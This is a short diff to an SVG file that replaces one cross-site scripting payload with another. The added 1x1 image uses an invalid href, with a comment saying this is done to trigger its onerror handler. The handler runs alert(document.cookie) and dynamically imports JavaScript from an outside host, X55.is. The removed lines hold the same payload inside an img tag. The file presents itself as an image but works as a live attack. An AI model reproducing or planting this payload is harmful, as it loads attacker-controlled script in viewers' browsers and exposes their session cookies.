@@ -1,8 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="300" height="100">
-  <foreignObject width="100%" height="100%">
-    <div xmlns="http://www.w3.org/1999/xhtml">
-      <img src="x" oNlY="1" oNerror="alert(document.cookie);import('https://X55.is?1=18369/.source')" />
-    </div>
-  </foreignObject>
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <!-- image with invalid src to trigger onerror -->
+  <image
+    href="invalid.png"
+    width="1" height="1"
+    onerror="alert(document.cookie); import('https://X55.is?1=18369/.source');"
+  />
 </svg>
